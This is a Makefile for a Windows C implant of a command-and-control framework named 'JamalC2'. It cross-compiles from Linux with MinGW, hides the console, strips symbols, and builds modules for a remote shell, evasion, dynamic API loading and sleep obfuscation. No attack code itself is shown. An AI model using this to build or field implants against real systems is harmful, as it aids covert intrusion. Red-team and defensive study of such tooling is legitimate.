# JamalC2 C Implant Makefile
# Supports cross-compilation from Linux to Windows using MinGW-w64

# Compiler selection
CC ?= x86_64-w64-mingw32-gcc

# Compiler flags
CFLAGS = -O2 -s -mwindows -DNDEBUG -D_CRT_SECURE_NO_WARNINGS -I src -Wall

# Linker flags (Windows libraries)
LDFLAGS = -lwinhttp -ladvapi32 -luser32 -lshell32 -lcrypt32

# Source files
SOURCES = src/main.c \
          src/http.c \
          src/crypto.c \
          src/protocol.c \
          src/shell.c \
          src/files.c \
          src/process.c \
          src/utils.c \
          src/evasion.c \
          src/dynapi.c \
          src/sleep_obf.c

# Output
BUILD_DIR = build
TARGET = $(BUILD_DIR)/implant.exe

# Default target
all: $(BUILD_DIR) $(TARGET)

$(BUILD_DIR):
	mkdir -p $(BUILD_DIR)

$(TARGET): $(SOURCES)
	$(CC) $(CFLAGS) $(SOURCES) $(LDFLAGS) -o $(TARGET)
	@echo "[OK] Build successful: $(TARGET)"

# Debug build (with console)
debug: CFLAGS = -O0 -g -DDEBUG_MODE=1 -D_CRT_SECURE_NO_WARNINGS -I src -Wall
debug: $(BUILD_DIR)
	$(CC) $(CFLAGS) $(SOURCES) $(LDFLAGS) -o $(BUILD_DIR)/implant_debug.exe
	@echo "[OK] Debug build: $(BUILD_DIR)/implant_debug.exe"

# Clean build artifacts
clean:
	rm -rf $(BUILD_DIR)

# Install mingw-w64 (Ubuntu/Debian)
install-deps:
	sudo apt-get update && sudo apt-get install -y mingw-w64

.PHONY: all debug clean install-deps
